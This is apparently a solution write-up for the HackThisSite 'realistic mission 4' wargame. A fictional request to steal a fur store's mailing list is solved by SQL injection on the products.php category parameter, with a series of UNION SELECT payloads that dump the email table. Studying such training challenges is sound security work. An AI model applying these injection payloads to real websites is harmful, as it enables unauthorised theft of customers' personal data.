  Message: Hello, I was referred to you by a friend who says you know how to hack into computers and web sites - well I was wondering 
    if you could help me out here. There's this local store who is killing hundreds of animals a day exclusively for the purpose of selling 
    jackets and purses etc out of their skin! I have been to their website and they have an email list for their customers. I was wondering 
    if you could somehow hack in and send me every email address on that list? I want to send them a message letting them know of the murder 
    they are wearing. Just reply to this message with a list of the email addresses. Please? Their website is at 
    http://www.hackthissite.org/missions/realistic/4/. Thanks so much!!



Solution:
  We are initially provided with what looks like an online store site.  There is a link to add yourself to the mailing list, to see fur coats, and to see 
  aligator accessories.  Clicking on the links provides the following URLs.

    https://www.hackthissite.org/missions/realistic/4/products.php?category=1
    https://www.hackthissite.org/missions/realistic/4/products.php?category=2

  Looking at these URLs my first thought is to use SQL injection on the URL.  I tried the following URL first to verify this:
    https://www.hackthissite.org/missions/realistic/4/products.php?category=1 LIMIT 1

  This returned a single result, so we know that SQL injection should work.  Now we have to find the correct tables for the data.  I tried the following URLs.

    https://www.hackthissite.org/missions/realistic/4/products.php?category=1 UNION SELECT * FROM email
    https://www.hackthissite.org/missions/realistic/4/products.php?category=1 OR category!=1
    https://www.hackthissite.org/missions/realistic/4/products.php?category=1 UNION ALL SELECT *,NULL FROM email
    https://www.hackthissite.org/missions/realistic/4/products.php?category=1 UNION ALL SELECT NULL, *, NULL FROM email

    https://www.hackthissite.org/missions/realistic/4/products.php?category=1 UNION ALL SELECT NULL, *, NULL, NULL FROM email
  This one returns the products and the list of emails.  So now we need to email the list to SaveTheWhales.  We can do that from the main HTS site.

  Return to the main page, click the HTS Messaging Center link.  Then click the Compose link.  Then send the message to savethewhlaes.
